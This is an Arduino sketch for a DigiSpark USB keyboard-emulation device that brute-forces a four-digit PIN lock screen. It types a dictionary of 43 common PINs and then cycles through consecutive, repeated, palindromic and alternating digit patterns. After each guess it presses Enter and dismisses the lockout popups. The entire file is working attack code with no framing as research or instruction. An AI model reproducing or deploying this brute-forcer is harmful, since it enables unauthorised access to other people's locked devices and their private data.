


#include "DigiKeyboard.h"

int num[10] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};

int pin_dict[43][4] = {{30, 31, 32, 33}, {30, 30, 30, 30}, {39, 39, 39, 39}, {30, 31, 30, 31}, {36, 36, 36, 36}, {30, 39, 39, 33}, {31, 39, 39, 39}, {33, 33, 33, 33}, {31, 31, 31, 31}, {35, 38, 35, 38}, {38, 38, 38, 38}, {32, 32, 32, 32}, {34, 34, 34, 34}, {35, 35, 35, 35}, {30, 30, 31, 31}, {30, 32, 30, 32}, {37, 37, 37, 37}, {31, 39, 39, 30}, {33, 32, 31, 30}, {30, 39, 30, 39}, {39, 38, 39, 38}, {31, 34, 37, 39}, {39, 39, 39, 36}, {30, 37, 30, 37}, {30, 31, 32, 39}, {30, 38, 37, 33}, {30, 38, 37, 35}, {39, 39, 36, 39}, {30, 38, 37, 34}, {39, 38, 37, 36}, {30, 39, 39, 39}, {30, 31, 32, 30}, {30, 38, 37, 36}, {30, 38, 38, 38}, {31, 33, 35, 37}, {31, 39, 39, 31}, {31, 32, 31, 32}, {39, 30, 31, 32}, {30, 30, 31, 32}, {30, 31, 32, 32}, {30, 32, 34, 36}, {30, 32, 31, 33}, {30, 38, 37, 37}};

int a = 0; 
int b = 9; 
int c = 0; 
int d = 0;
int e = 0;
int f = 0;
int g = 0;
int h = 0;
int count = 0;

int dict_size = 43;
int dict_counter = 0;



//Setup
void setup()
{
  //Makes sure the PIN input field is working.
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}
//Setup - END



//click_OK
void click_OK()
{
  //Presses OK/Enter and delays for 1s before the next attempt.
  if (count < 53)
    count++;
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
}
//click_OK - END



//wait
void wait()
{
  //Waits for 31 seconds after the first 5 attempts and the 5 attempts after them. Then, waits for 31 seconds after each wrong attempt.
  if(count == 5 || count == 10 || count > 10)
  {
    digitalWrite(1,HIGH);
    DigiKeyboard.sendKeyStroke(40); //Clicking OK to make the popup go away
//    delay(31000);
    digitalWrite(1,LOW);
  }
}
//wait - END



//dict_attack
void dict_attack()
{
  //Dictionaty Attack - Supplies values from the dictionary
  if (dict_size > 0)
  {
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][0]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][1]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][2]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][3]);
    dict_counter++;
    dict_size--;
    click_OK();
    wait();
  }
}
//dict_attack - END



//consecutives_asc
void consecutives_asc()
{
  //Ascending Consecutive Digits -> 2345, 3456, 4567,...
  if (a <= 9)
  {
    if (a == 1 || a == 0) // != 0123 & != 1234 -> dict
      a = 2;
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[(a+1)%10]);
    DigiKeyboard.sendKeyStroke(num[(a+2)%10]);
    DigiKeyboard.sendKeyStroke(num[(a+3)%10]);
    click_OK();
    wait();
    a++;
    if (count <= 30)
      count++;
  }
}
//consecutives_asc - END



//consecutives_desc
void consecutives_desc()
{
  //Descending Consecutive Digits -> 9876, 8765, 7654,...
  if (b > 0) //!= 0987 -> dict
  {
    if (b == 4) // != 4321 -> dict
      b--;
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[(b+9)%10]);
    DigiKeyboard.sendKeyStroke(num[(b+8)%10]);
    DigiKeyboard.sendKeyStroke(num[(b+7)%10]);
    b--;
    click_OK();
    wait();
  }
}
//consecutives_desc - END



//repeated
void repeated()
{
  //Repeated Digits -> 3344, 4455, 5566,...
  if (c <= 9)
  {
    if (d <= 9)
    {
      if (c == d)
        d++;
      if (c == 1 && d == 2) //!= 1122 -> dict.
        d++;
      if (c != 9 || d != 9)
      {
        DigiKeyboard.sendKeyStroke(num[c]);
        DigiKeyboard.sendKeyStroke(num[c]);
        DigiKeyboard.sendKeyStroke(num[d]);
        DigiKeyboard.sendKeyStroke(num[d]);
        d++;
        click_OK();
        wait();
      }
      else
        d++;
    }
    else
    {
      d = 0;
      c++;
    }
  }
}
//repeated - END



//palindromes
void palindromes()
{
  //Palindromic Digits -> 2332, 3443, 8998,...
  if (e <= 9)
  {
    if (f <= 9)
    {
      if (e == f)
        f++;
      if (e != 9 || f != 9)
      {
        DigiKeyboard.sendKeyStroke(num[e]);
        DigiKeyboard.sendKeyStroke(num[f]);
        DigiKeyboard.sendKeyStroke(num[f]);
        DigiKeyboard.sendKeyStroke(num[e]);
        f++;
        click_OK();
        wait();
      }
      else
        f++;
    }
    else
    {
      f = 0;
      e++;
    }
  }
}
//palindromes - END



//alternating
void alternating()
{
  //Alternating Digits -> 3434, 5656, 8989,...
  if (g <= 9)
  {
    if (h <= 9)
    {
      if (g == h)
        h++;
      if (g == 1 && (h == 2 || h == 3)) //!= 1212 & 1313 -> dict
        h = 4;
      if (g == 1 && (h == 0 || h == 8))//!= 1010 & 1818 -> dict
        h = 9;
      if (g != 9 || h != 9)
      {
        DigiKeyboard.sendKeyStroke(num[g]);
        DigiKeyboard.sendKeyStroke(num[h]);
        DigiKeyboard.sendKeyStroke(num[g]);
        DigiKeyboard.sendKeyStroke(num[h]);
        h++;
        click_OK();
        wait();
      }
      else
        h++;
    }
    else
    {
      h = 0;
      g++;
    }
  }
}
//alternating - END



//Loop
void loop()
{
  //Dictionary Attack
  dict_attack();

  //Brute forcing based on the most common patterns
  if (dict_size == 0 || count >= 53)
  {
    consecutives_asc();
    consecutives_desc();
    repeated();
    palindromes();
    alternating();
  }
}
//Loop - END
